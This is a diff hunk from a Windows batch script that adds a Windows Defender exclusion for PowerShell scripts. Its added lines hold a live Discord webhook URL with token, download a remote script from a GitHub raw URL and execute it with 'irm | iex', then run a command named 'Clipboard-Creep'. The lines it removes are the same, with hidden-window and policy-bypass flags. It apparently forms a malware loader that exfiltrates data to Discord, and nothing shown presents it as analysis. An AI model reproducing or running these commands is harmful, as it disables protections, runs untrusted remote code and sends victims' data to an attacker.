@@ -28,5 +28,5 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension ps1"
 cd %TEMP%
-powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1377273360899244032/sfISpqX7vLusl2HGJ3Jwsirra-A6vPogZPUEsTTmYPgDVCXWnRIIGYy5UObuNX1P8wVF'; irm https://raw.githubusercontent.com/CloudFox9/Files/refs/heads/main/snaky.ps1 | iex
-powershell -NoP -Ep Bypass -W H -C Clipboard-Creep
+powershell -C $dc='https://discord.com/api/webhooks/1377273360899244032/sfISpqX7vLusl2HGJ3Jwsirra-A6vPogZPUEsTTmYPgDVCXWnRIIGYy5UObuNX1P8wVF'; irm https://raw.githubusercontent.com/CloudFox9/Files/refs/heads/main/snaky.ps1 | iex
+powershell -C Clipboard-Creep
